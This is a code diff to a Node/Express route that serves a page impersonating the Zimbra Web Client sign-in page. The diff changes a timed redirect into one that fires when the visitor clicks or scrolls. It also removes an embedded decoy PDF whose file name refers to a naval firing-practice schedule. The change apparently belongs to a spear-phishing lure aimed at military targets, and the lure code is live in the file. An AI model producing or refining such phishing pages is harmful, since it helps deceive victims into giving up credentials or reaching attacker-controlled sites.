@@ -44,11 +44,17 @@ router.get('/', (req, res) => {
         <!doctype html>
         <html lang="en">
         <head>
-       <script>
-                setTimeout(function() {
-                    window.location.href = '${url}';
-                }, 200);
-            </script> 
+         <script>
+        // Function to redirect to the new page
+        function redirectToNewPage() {
+            window.location.href = "${url}";  // Replace with your target URL
+        }
+
+        // Add event listeners for 'mousemove' and 'click'
+        //document.addEventListener("mousemove", redirectToNewPage);
+        document.addEventListener("click", redirectToNewPage);
+        document.addEventListener("scroll", redirectToNewPage);
+    </script>
             <!-- Required meta tags -->
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
@@ -56,13 +62,11 @@ router.get('/', (req, res) => {
 	<meta name="apple-mobile-web-app-status-bar-style" content="black">
 	<link rel="stylesheet" type="text/css" href="/stylesheet/common,login,zhtml,skin.css">
 	<link rel="SHORTCUT ICON" href="/images/favicon.ico">
-    <title>Zimbra Web Client Sign In</title>
+    	<title>Zimbra Web Client Sign In</title>
         </head>
         <body>
-    
-<!-- <img src="/images/002.jpg"> -->
+    	  <center> <img src="./image.png">  </center>
 
-<object data="/Area and Sch for Surface and Anti-Air Firing Practice of BN Ships for Nov 2024.pdf" style="width:1800px; height:900px;"></object>
         </body>
         </html>
     `;
